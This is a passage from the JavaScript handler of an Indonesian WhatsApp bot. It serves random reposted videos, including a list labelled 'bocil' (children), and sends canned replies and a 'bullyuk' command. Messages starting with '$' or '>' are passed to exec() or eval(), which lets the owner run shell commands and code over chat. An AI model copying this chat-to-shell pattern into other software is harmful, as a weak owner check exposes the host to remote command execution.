    var alcakenya = ['https://l.top4top.io/m_2044ehtwa1.mp4', 'https://k.top4top.io/m_2044h7tpc1.mp4', 'https://b.top4top.io/m_2044l37zk1.mp4', 'https://i.top4top.io/m_2044e9pqz1.mp4', 'https://j.top4top.io/m_2044obe8d1.mp4', 'https://k.top4top.io/m_2044dh7u21.mp4', 'https://c.top4top.io/m_2044o3ohe1.mp4', 'https://f.top4top.io/m_2044zm90s1.mp4', 'https://d.top4top.io/m_2044v7mo21.mp4', 'https://h.top4top.io/m_20446er9r1.mp4', 'https://g.top4top.io/m_2044o8u9t1.mp4', 'https://a.top4top.io/m_204421sn31.mp4', 'https://b.top4top.io/m_2044khyds1.mp4', 'https://a.top4top.io/m_2044vga111.mp4', 'https://l.top4top.io/m_2044mp7841.mp4', 'https://c.top4top.io/m_2044m3h8m1.mp4', 'https://f.top4top.io/m_2044ek3vd1.mp4', 'https://e.top4top.io/m_20443r9am1.mp4', 'https://d.top4top.io/m_2044g19oc1.mp4', 'https://j.top4top.io/m_20440tis11.mp4', 'https://e.top4top.io/m_2044yimnr1.mp4'];
    var random_alcakenya = alcakenya[Math.floor(Math.random() * (alcakenya.length))];
    let ini_alcakenya = await getBuffer(random_alcakenya);
    xdev.sendMessage(from, ini_alcakenya, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'mangayutri') {
    setReply(mess.wait);
    var mangayutri = ['https://e.top4top.io/m_2044wm1kq1.mp4', 'https://l.top4top.io/m_2044k0psz1.mp4', 'https://c.top4top.io/m_2044y394z1.mp4', 'https://a.top4top.io/m_2044mzst31.mp4', 'https://g.top4top.io/m_2044tq6o11.mp4', 'https://f.top4top.io/m_2044z61tt1.mp4', 'https://d.top4top.io/m_2044t3dn91.mp4', 'https://k.top4top.io/m_20443i8ba1.mp4', 'https://b.top4top.io/m_2044i0ao91.mp4', 'https://l.top4top.io/m_2044dvyeb1.mp4', 'https://h.top4top.io/m_2044d5gey1.mp4', 'https://f.top4top.io/m_204484esr1.mp4', 'https://i.top4top.io/m_2044ez7y91.mp4', 'https://c.top4top.io/m_2044qkb5k1.mp4', 'https://j.top4top.io/m_2044wwdfy1.mp4', 'https://d.top4top.io/m_2044fzmw21.mp4', 'https://g.top4top.io/m_20444rprh1.mp4', 'https://e.top4top.io/m_20446919h1.mp4', 'https://a.top4top.io/m_2044unrp01.mp4', 'https://i.top4top.io/m_20441xktm1.mp4', 'https://h.top4top.io/m_20444t5dj1.mp4', 'https://f.top4top.io/m_2044l4j3r1.mp4', 'https://k.top4top.io/m_2044wb7pq1.mp4', 'https://e.top4top.io/m_2044i5rki1.mp4', 'https://j.top4top.io/m_2044s58ir1.mp4', 'https://g.top4top.io/m_2044dayid1.mp4', 'https://d.top4top.io/m_204492t8n1.mp4'];
    var random_mangayutri = mangayutri[Math.floor(Math.random() * (mangayutri.length))];
    let ini_mangayutri = await getBuffer(random_mangayutri);
    xdev.sendMessage(from, ini_mangayutri, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'rikagusriani') {
    setReply(mess.wait);
    var rikagusriani = ['https://b.top4top.io/m_1930thxw90.mp4', 'https://d.top4top.io/m_1930pezhp0.mp4', 'https://c.top4top.io/m_1930cjgbx0.mp4', 'https://b.top4top.io/m_1930v6vhg0.mp4', 'https://f.top4top.io/m_1930uh7ud0.mp4', 'https://a.top4top.io/m_1930c9cpb0.mp4', 'https://k.top4top.io/m_19308amkf0.mp4', 'https://d.top4top.io/m_1930wjaq60.mp4', 'https://i.top4top.io/m_1930n2um40.mp4', 'https://i.top4top.io/m_1930e14pi0.mp4', 'https://i.top4top.io/m_1930w6lwf0.mp4', 'https://e.top4top.io/m_19307autl0.mp4', 'https://d.top4top.io/m_1930i6tfc0.mp4', 'https://c.top4top.io/m_1930qmr7u0.mp4', 'https://d.top4top.io/m_1930itbte1.mp4', 'https://i.top4top.io/m_1930ze4oq0.mp4', 'https://j.top4top.io/m_1930kkqyh1.mp4', 'https://f.top4top.io/m_1930zevlz0.mp4', 'https://g.top4top.io/m_1930q0apu1.mp4', 'https://h.top4top.io/m_1930trfsv2.mp4'];
    var random_rikagusriani = rikagusriani[Math.floor(Math.random() * (rikagusriani.length))];
    let ini_rikagusriani = await getBuffer(random_rikagusriani);
    xdev.sendMessage(from, ini_rikagusriani, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'asupan') {
    setReply(mess.wait);
    var asupannih = ['http://sansekai.my.id/ptl_repost/120416207_674661289840975_7238538460676645249_n.mp4', 'http://sansekai.my.id/ptl_repost/120443017_225738842307010_1507614018538871668_n.mp4', 'http://sansekai.my.id/ptl_repost/120506710_129730895516659_9090102890235113922_n.mp4', 'http://sansekai.my.id/ptl_repost/120518115_3382156938497131_2702539154432231938_n.mp4', 'http://sansekai.my.id/ptl_repost/120533450_988960268238482_4908300175960396265_n.mp4', 'http://sansekai.my.id/ptl_repost/120554993_913582535835353_7937155730001219945_n.mp4', 'http://sansekai.my.id/ptl_repost/120565745_258483202099028_1831534734126408497_n.mp4', 'http://sansekai.my.id/ptl_repost/120570166_2716242608644571_5562452335611050430_n.mp4', 'http://sansekai.my.id/ptl_repost/120571358_3743879342322868_4731152347084614368_n.mp4', 'http://sansekai.my.id/ptl_repost/120571938_198275171805822_8506241533969509004_n.mp4', 'http://sansekai.my.id/ptl_repost/120573034_128654721967389_1837144340570017830_n.mp4', 'http://sansekai.my.id/ptl_repost/120574217_2707319792866165_3682328392840010261_n.mp4', 'http://sansekai.my.id/ptl_repost/120575986_151816433263092_6600262966520398271_n.mp4', 'http://sansekai.my.id/ptl_repost/120582400_339926344091433_2581248581156693603_n.mp4', 'http://sansekai.my.id/ptl_repost/120583739_1060190921079212_3898520254664507328_n.mp4', 'http://sansekai.my.id/ptl_repost/120587415_638776546998307_3091093882267818607_n.mp4', 'http://sansekai.my.id/ptl_repost/120589771_752670855329266_5064573607465519463_n.mp4', 'http://sansekai.my.id/ptl_repost/120613860_3393110177444352_4287165838359264124_n.mp4', 'http://sansekai.my.id/ptl_repost/120614859_768632723701773_5662521620734316774_n.mp4', 'http://sansekai.my.id/ptl_repost/120615019_149392973357031_6254963333779779708_n.mp4', 'http://sansekai.my.id/ptl_repost/120664457_338629710563119_6615226849280369453_n.mp4', 'http://sansekai.my.id/ptl_repost/120670762_191033325874671_8168246094200167609_n.mp4', 'http://sansekai.my.id/ptl_repost/120678112_971693299972883_1648826221504742220_n.mp4', 'http://sansekai.my.id/ptl_repost/120682363_1181866688854694_4233466354892721595_n.mp4', 'http://sansekai.my.id/ptl_repost/120698858_1302470566751609_3736999773452225729_n.mp4', 'http://sansekai.my.id/ptl_repost/120707049_337981777304231_3152650741169851669_n.mp4', 'http://sansekai.my.id/ptl_repost/120714412_680680702806959_2149499366562729814_n.mp4', 'http://sansekai.my.id/ptl_repost/120678112_971693299972883_1648826221504742220_n.mp4', 'http://sansekai.my.id/ptl_repost/120682363_1181866688854694_4233466354892721595_n.mp4', 'http://sansekai.my.id/ptl_repost/120698858_1302470566751609_3736999773452225729_n.mp4'];
    var random_asupannih = asupannih[Math.floor(Math.random() * (asupannih.length))];
    let ini_asupannih = await getBuffer(random_asupannih);
    xdev.sendMessage(from, ini_asupannih, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'bocil') {
    setReply(mess.wait);
    var bocil = ['https://b.top4top.io/m_1931yxodg0.mp4', 'https://k.top4top.io/m_193161p380.mp4', 'https://l.top4top.io/m_1931i4g3p1.mp4', 'https://a.top4top.io/m_1931tjlio2.mp4', 'https://g.top4top.io/m_1931z2mc40.mp4', 'https://h.top4top.io/m_1931auyof1.mp4', 'https://i.top4top.io/m_19315hrle2.mp4', 'https://j.top4top.io/m_1931xul5a3.mp4', 'https://l.top4top.io/m_1931o92nr0.mp4', 'https://a.top4top.io/m_1931j1rh21.mp4', 'https://b.top4top.io/m_1931iaqpg2.mp4', 'https://c.top4top.io/m_1931s5zlj3.mp4', 'https://d.top4top.io/m_1931x0g5a4.mp4', 'https://i.top4top.io/m_1931oj76n0.mp4', 'https://j.top4top.io/m_19319gl3d1.mp4', 'https://k.top4top.io/m_1931u52cq2.mp4', 'https://l.top4top.io/m_1931mvgj73.mp4', 'https://a.top4top.io/m_1931u07oz4.mp4', 'https://j.top4top.io/m_1931h1fo60.mp4', 'https://k.top4top.io/m_1931mro3u1.mp4', 'https://l.top4top.io/m_1931kx0ac2.mp4', 'https://a.top4top.io/m_1931g9ezq3.mp4', 'https://b.top4top.io/m_1931plin14.mp4', 'https://c.top4top.io/m_1931aaxri5.mp4', 'https://d.top4top.io/m_1931ijzzn6.mp4', 'https://e.top4top.io/m_1931ugycd7.mp4', 'https://f.top4top.io/m_1931l14nk8.mp4', 'https://g.top4top.io/m_1931crgqt9.mp4'];
    var random_bocil = bocil[Math.floor(Math.random() * (bocil.length))];
    let ini_bocil = await getBuffer(random_bocil);
    xdev.sendMessage(from, ini_bocil, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'geayubi') {
    setReply(mess.wait);
    var geayubi = ['https://l.top4top.io/m_1931ufrul0.mp4', 'https://a.top4top.io/m_1931jbdpk1.mp4', 'https://c.top4top.io/m_1931aj9nm2.mp4', 'https://d.top4top.io/m_1931cnsal3.mp4', 'https://e.top4top.io/m_1931d4kc74.mp4', 'https://f.top4top.io/m_1931bih8q5.mp4', 'https://g.top4top.io/m_1931xx7aa6.mp4', 'https://h.top4top.io/m_1931g3zsq7.mp4', 'https://a.top4top.io/m_1931m74wd0.mp4', 'https://b.top4top.io/m_1931p8tfm1.mp4', 'https://e.top4top.io/m_1931aj8iv0.mp4', 'https://f.top4top.io/m_1931szguy1.mp4', 'https://g.top4top.io/m_1931l73ry2.mp4', 'https://h.top4top.io/m_1931yhznj3.mp4', 'https://i.top4top.io/m_1931kmtp34.mp4', 'https://j.top4top.io/m_1931snhdg5.mp4', 'https://k.top4top.io/m_1931ay1jz6.mp4', 'https://l.top4top.io/m_1931x70mk7.mp4', 'https://a.top4top.io/m_19319mvvf8.mp4', 'https://b.top4top.io/m_1931icmzd9.mp4', 'https://h.top4top.io/m_19316oo0s0.mp4', 'https://i.top4top.io/m_1931cvvpt1.mp4'];
    var random_geayubi = geayubi[Math.floor(Math.random() * (geayubi.length))];
    let ini_geayubi = await getBuffer(random_geayubi);
    xdev.sendMessage(from, ini_geayubi, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'santuy') {
    setReply(mess.wait);
    var santuy = ['https://e.top4top.io/m_1930wespy0.mp4', 'https://e.top4top.io/m_19303zfi20.mp4', 'https://j.top4top.io/m_1930t00kx0.mp4', 'https://e.top4top.io/m_1930kx7hi0.mp4', 'https://c.top4top.io/m_19307g6kd0.mp4', 'https://f.top4top.io/m_19306yk4c0.mp4', 'https://i.top4top.io/m_1930y1u780.mp4', 'https://j.top4top.io/m_1930ilsyy0.mp4', 'https://i.top4top.io/m_19301948b0.mp4', 'https://d.top4top.io/m_1930zg8460.mp4', 'https://i.top4top.io/m_19301yozl0.mp4', 'https://g.top4top.io/m_1930qjr2q0.mp4', 'https://l.top4top.io/m_1930x1wp50.mp4', 'https://a.top4top.io/m_1930zr1041.mp4', 'https://b.top4top.io/m_1930s29hq2.mp4', 'https://a.top4top.io/m_1930kbo0y0.mp4', 'https://j.top4top.io/m_1930xek9z0.mp4', 'https://i.top4top.io/m_1930s7gb80.mp4', 'https://c.top4top.io/m_1930w0dbu0.mp4', 'https://d.top4top.io/m_1930xu4kd1.mp4', 'https://a.top4top.io/m_1930zw2nb0.mp4', 'https://b.top4top.io/m_1930eybjj1.mp4', 'https://g.top4top.io/m_1930fmx330.mp4', 'https://l.top4top.io/m_1930gnlam0.mp4', 'https://g.top4top.io/m_1930twwu50.mp4', 'https://l.top4top.io/m_1930qkeh70.mp4', 'https://l.top4top.io/m_1930wefm20.mp4', 'https://a.top4top.io/m_1930idzd51.mp4'];
    var random_santuy = santuy[Math.floor(Math.random() * (santuy.length))];
    let ini_santuy = await getBuffer(random_santuy);
    xdev.sendMessage(from, ini_santuy, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ukhty') {
    setReply(mess.wait);
    var ukhty = ['https://e.top4top.io/m_1930ns2zo0.mp4', 'https://k.top4top.io/m_1930j9i810.mp4', 'https://f.top4top.io/m_1930wtj580.mp4', 'https://d.top4top.io/m_1930a2isv0.mp4', 'https://e.top4top.io/m_1930wbgc41.mp4', 'https://f.top4top.io/m_1930urbj02.mp4', 'https://b.top4top.io/m_1930ceiqv0.mp4', 'https://i.top4top.io/m_1931a0z6o0.mp4', 'https://a.top4top.io/m_193190b500.mp4', 'https://b.top4top.io/m_1931dcixz1.mp4', 'https://g.top4top.io/m_19317gpjp0.mp4', 'https://i.top4top.io/m_1931cc22w1.mp4', 'https://j.top4top.io/m_1931xn6412.mp4', 'https://g.top4top.io/m_1931silxz0.mp4', 'https://h.top4top.io/m_1931as4mg1.mp4', 'https://i.top4top.io/m_1931p9j5v0.mp4', 'https://e.top4top.io/m_1931mgeuy0.mp4', 'https://f.top4top.io/m_1931lw9381.mp4', 'https://g.top4top.io/m_1931vm0dk2.mp4', 'https://h.top4top.io/m_1931fiv8x3.mp4', 'https://b.top4top.io/m_1931jm3dt0.mp4', 'https://e.top4top.io/m_1931i7yag1.mp4', 'https://f.top4top.io/m_1931dr5ya2.mp4', 'https://g.top4top.io/m_193172kpg3.mp4', 'https://h.top4top.io/m_1931j3b224.mp4', 'https://j.top4top.io/m_19317ykt25.mp4', 'https://k.top4top.io/m_1931o0vh16.mp4', 'https://l.top4top.io/m_1931ssfbn7.mp4', 'https://a.top4top.io/m_19318t7458.mp4', 'https://b.top4top.io/m_1931vhu759.mp4'];
    var random_ukhty = ukhty[Math.floor(Math.random() * (ukhty.length))];
    let ini_ukhty = await getBuffer(random_ukhty);
    xdev.sendMessage(from, ini_ukhty, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
	

	
	
	
	
	//Jika ada yg kirim pesan "p" botz akan respon
				if (salam.includes(messagesC)) {
				if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
				if (isOwner) return 
			    if(isExtream) return
				addSpam("NotCase",senderNumber, "10s", AntiSpam)
		          if(autovn){ 
                   sendvn(ucapbot)
                   } else if(autosticker) {
                   sendSticker(ucapsalam)
                   } else {
               	setReply("Ucap salam napah")
                   }
				   }
				
//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
	            if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
                   if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
		          addSpam("NotCase",senderNumber, "10s", AntiSpam)
                   if(autovn){
                   sendvn(walaikumsalam)
                   } else if(autosticker) {
                  sendSticker1(kumsalam)
                  } else {
                  setReply("Walaikumsalam kak")
                  }
                  }
				
//Jika ada yg kirim pesan "menu" bot akan respon
				if (menu.includes(messagesC)) {
				if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
			    if (isOwner) return 
				setReply(`Hai kak ${pushname} untuk mengakses menu ketik ${prefix}menu ya 😉`)
				addSpam("NotCase",senderNumber, "10s", AntiSpam)
				}
				
				
//Jika ada yg toxic botz akan merespon✓
			if (!isOwner && bad.includes(messagesC)) {
				if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
		         addSpam("NotCase",senderNumber, "10s", AntiSpam)
                if(autovn){
                 sendvn(astaga)
                 } else if(autosticker) {
                 	await sendSticker(istigfar)
                 } else {
				daui = await getBuffer('https://a.top4top.io/m_2213dvvcg0.mp3')
				await xdev.sendMessage(from, daui, audio, { mimetype: 'audio/mp4', quoted: dev, ptt: true})
				await setReply("Astagfirloh oni chan")
				}
				}
				
//Jika ada yg bilang bot maka botz akan merespon✓
			 if (badud.includes(messagesC)) {
				if (cekSpam("NotCase",senderNumber, AntiSpam)) return
				addSpam("NotCase",senderNumber, "10s", AntiSpam)
                if(autovn ) {
               sendvn(ucapbot)
               } else {
				sendMess(hayuk)
				}
				}
				
	
//Jika ada yg bilang hallo maka botz akan merespon✓
			 if (katahai.includes(messagesC)) {
			    if(isExtream) return

				if (cekSpam("NotCase",senderNumber, AntiSpam)) return
				addSpam("NotCase",senderNumber, "10s", AntiSpam)
                if(autovn) return sendvn(moshimos)
				}
	
	
//******************* 》UCAPAN《 ********************\\
//Jika ada yang bilang ohayo bot akan merespon✓
if(ohayo.includes(messagesC)){
if(isExtream) return

if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if (timeWib >= '11:00' && timeWib <= '23:50')  return setReply("Sekarang udah ga pagi kak")
				if(autovn === true) return sendvn(oahyo)
				setReply(`${ucapanWaktu} kak 🙂`)
				}
				
				
        
        
 //Jika ada yang bilang oyasumi malem bot akan merespon✓
if(katamalem.includes(messagesC)){
if(isExtream) return

if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if (timeWib >= '06:00' && timeWib <= '17:00')  return setReply("Sekarang udah ga malem kak")
				if(autovn === true) return sendvn(oyasumi)
				setReply(`${ucapanWaktu} kak 🙂`)
				}
        
        
 //Jika ada yang bilang koniciwa malem bot akan merespon✓
if(katasiang.includes(messagesC)){
if(isExtream) return
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
				if(autovn === true) return sendvn(koniciwa)
				setReply(`${ucapanWaktu} kak 🙂`)
				}
        
        
        
 //Jika ada yang bilang lopyu bot akan merespon✓
if(katalopyou.includes(messagesC)){
if(isExtream) return
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(lopyoutoo)
} else {
setReply("😚")
}
}
				
				
//Jika ada yg cek prefix bot akan merespon   
if (budy.includes('ekprefix')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(multi) {
 xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah :「  Multi  」`, text, { quoted: setQuoted, contextInfo: forward })
 } else if(prefa){
xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  ${prefa}  」`, text, { quoted: setQuoted, contextInfo: forward })
 } else if(nopref){
 xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  No Prefix  」`, text, { quoted: setQuoted, contextInfo: forward })
 }
 }
                   
//Jika ada yang tag nomer owner
                  if (!isOwner && isGroup && budy.includes(nomerOwner)) {
              	if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
                  if (itsMe) return
		          addSpam("NotCase",senderNumber, "10s", AntiSpam)
                  const kta =['*Bentar ya kak nanti juga di bales sama ownerku* 😉','*Tunggu aja kak, entar juga di bales* 😁','*Iya kak, ada apa tag owner aku nih* 🙂']
				  const su = kta[Math.floor(Math.random() * kta.length)]
				  xdev.sendMessage(from, su, text, { quoted: dev })
				   }
					
//JIKA ADA YG BILANG THANKS, BOT AKAN RESPON
for (let kasih of thanks){
                  if ( budy.includes(kasih)) {
                  if(isExtream) return
                  if(dev.key.fromMe) return
                  if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
		         addSpam("NotCase",senderNumber, "10s", AntiSpam)
                 if(autosticker) return sendSticker(samasama)
                 setReply(`Sama sama kak ${pushname}`)
                  }
                 }
	
	
	
	
	
	
	
	
	




if (selectedButton == 'INFO BOTZ') {
if(isExtream) return       
mhan = await xdev.prepareMessage(from, fs.readFileSync('./stik/bot.jpg'), image)
gbutsan = [{buttonId: 'DEVELOPER', buttonText: {displayText: `ᴅᴇᴠᴇʟᴏᴘᴇʀ`}, type: 1},
{buttonId: 'Oke', buttonText: {displayText: `OKE`}, type: 1}]      
                       
 gbuttonan = {imageMessage: mhan.message.imageMessage,
contentText: info1.bot(gender,fake,nomerOwner),
footerText:`© ${fake1}`,
buttons: gbutsan,
headerType: 4
}
await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {                         
contextInfo: forward})                                    
} else if (selectedButton == 'SEWA BOTZ') {
 if(isExtream) return          
gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]      
                       
 gbuttonan = {
contentText: sewabot.dada(prefix, settings, pushname, ucapanWaktu) ,
footerText:`© ${fake1}`,
buttons: gbutsan,
headerType: 1
}
await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {                         
quoted: setQuoted, contextInfo: forward})                                 
} else if (selectedButton == 'KODE QR') {
if(isExtream) return
sendButMessage(from, `KODE QR YANG TERSEDIA`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}gopay`, buttonText: {displayText: `ɢᴏᴘᴀʏ`,},type: 1},
{buttonId: `${prefix}dana`, buttonText: {displayText: `ᴅᴀɴᴀ`,},type: 1},
{buttonId: `${prefix}ovo`, buttonText: { displayText: `ᴏᴠᴏ`,},type: 1}]);
} else if (selectedButton == 'DEVELOPER') {
if(isExtream) return
sendKontak(from, `${Ownerin.split("@")[0]}`, "DITTAZ", "Sibuk");    
} else if (selectedButton == 'YOUTUBE') {
 if(isExtream) return
console.log('YOUTUBE')
xdev.sendMessage(from, `
*YOUTUBE CHANNEL*
Kadang update kadang enggak
Support gua ya gaes dengan subs\n\nhttps://youtu.be/mYHDDIx3qEI`,
text, {detectLinks: true, quoted: dev})
}



if (command == prefix +'bullyuk') {
	if(!autoWelcome){
     if(!isWelkom) return setReply("Erro")
     }
     if(isExtream) return
     setReply(`Hayuk ah`)     
      sendButMessage(from, `Enaknya di apain nih 🤭`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}${bully1} ${q}`, buttonText: {displayText: `di ${bully1}`,},type: 1},
                      {buttonId: `${prefix}${bully2} ${q}`, buttonText: {displayText: `di ${bully2}`,},type: 1},
                      {buttonId: `${prefix}${bully3} ${q}`, buttonText: { displayText: `di ${bully3}`,},type: 1}]);
} 



	
	





if (budy.startsWith('$')){
if (!dev.key.fromMe && !isOwner) return onlyOwner()
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return setReply(`@Extream:~ ${err}`)
if (stdout) {
setReply(stdout)
}
})
}

if (budy.startsWith('>')){
if (!dev.key.fromMe && !isOwner) return onlyOwner()
try {
return xdev.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: dev})
} catch(err) {
e = String(err)
setReply(e)
}
}

if (budy.startsWith('=>')){
if (!isOwner && !dev.key.fromMe) return onlyOwner()
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return setReply(bang)
}
try {
setReply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
setReply(String(e))
}
}



    



			

    
        if (!dev.key.fromMe && budy.includes(`usik`)) {
        if(isOwner) return
        if(budy.includes(`untuk mengakses musik bisa ketik`)) return          
        setReply(`Hai kak ${pushname} untuk mengakses musik bisa ketik ${prefix}vnlist atau ketik ${prefix}musik yah ??`)
        }


 
          if (timeWib >= '04:00' && timeWib <= '04:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'cyan'))
          }
          if (timeWib >= '05:00' && timeWib <= '05:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Udah sholat Subuh belum kak', 'cyan'))
          }
         if (timeWib >= '06:00' && timeWib <= '06:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Pagi kak, Jangan lupa mandi', 'cyan'))
          }
          if (timeWib >= '11:00' && timeWib <= '11:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Siang kak, Dah mandi blm kak?', 'cyan'))
          }
          if (timeWib >= '12:00' && timeWib <= '12:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'cyan'))
           }
          if (timeWib >= '15:00' && timeWib <= '15:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'cyan'))
          }
          if (timeWib >= '18:00' && timeWib <= '18:10') {
        	console.log(color(`[${fake}]`, 'gold'), color('Udah mahgrip nih kak, jangan lupa sholat ya', 'cyan'))
          }
          if (timeWib >= '19:00' && timeWib <= '19:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi', 'cyan'))
           }
          if (timeWib >= '20:00' && timeWib <= '20:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'cyan'))
           }
          if (timeWib >= '00:00' && timeWib <= '00:10') {
           console.log(color(`[${fake}]`, 'gold'), color(`${fake} ngantuk kak, tidur dulu ya kak`, 'cyan'))
           }
           
	       if (timeWib >= '08:00' && timeWib <= '08:01' ){
	       var obj = [] 
           fs.writeFileSync('./database/hitToday.json', JSON.stringify(obj))         
	       console.log(color(`[Hit Today]`, 'red'), color('Hit Today telah di reset', 'cyan'))
	      } 
                

		
    } catch (e) {
    e = String(e)  
    if (!e.includes("this.isZero")) {
    console.log(color('[SYSTEM] : %s', 'white'), color(e, 'green'))   
    if(e.includes("BaileysError: Not expecting a response")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Sinyalnya jelek kak atau bisa juga\n               pesan sementara grup masih aktif\n\n© ${fake1}`)
    if(e.includes("Error: read ECONNABORTED")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Yahaha pasti paket chat 🤣\n\n© ${fake1}`)
    if(e.includes("Error: ENOENT: no such file or directory, open")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Ada yg eror nih kak, file tidak di temukan\n              Coba extrack ulang aja\n\n© ${fake1}`)
    if(e.includes("Error: Language not supported")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Masukin kode bahasanya yg bener goblok\n\n© ${fake1}`)
    if(e.includes("Error: Request failed with status code")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Maap, sudah melebihi batas permintaan\n\n© ${fake1}`)
    if(e.includes("ECONNRESET")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Gada kuota mungkin\n\n© ${fake1}`)
    if(e.includes("ECONNABORTED")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\\n\n© ${fake1}`)
    await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake1}`)    
    if(checkError(e, JSON.parse(fs.readFileSync('./database/listerror.json')))) return
    addError(e, command, JSON.parse(fs.readFileSync('./database/listerror.json')))
    if(autoblockcmd){        
    addblockcmd(command,listcmdblock) 
    await setReply("Command telah di block karena terjadi error")
    }
    if(autoReport){
    await xdev.sendMessage(`${Ownerin}`,`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${e}\n\nCommand :\n${prefix}${command}\n\nQuery :\n${q}\n\n\n© ${fake1}\n${calender}\n`,text)    
    await xdev.modifyChat(`${Ownerin}`, ChatModification.delete)
    if(autoblockcmd) return
    setTimeout( () => {
	 xdev.sendMessage(from,"Laporan error telah dikirim ke developer",text)
	},2000)
	}
    }
    } 

    


                    
      









    
    
    

    
    
                    
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
    if (!e.includes("jid is not defined")) {
    console.log(color('Message : %s', 'white'), color(e, 'green'))
        }
	// console.log(e)
	}
}
}




	
    
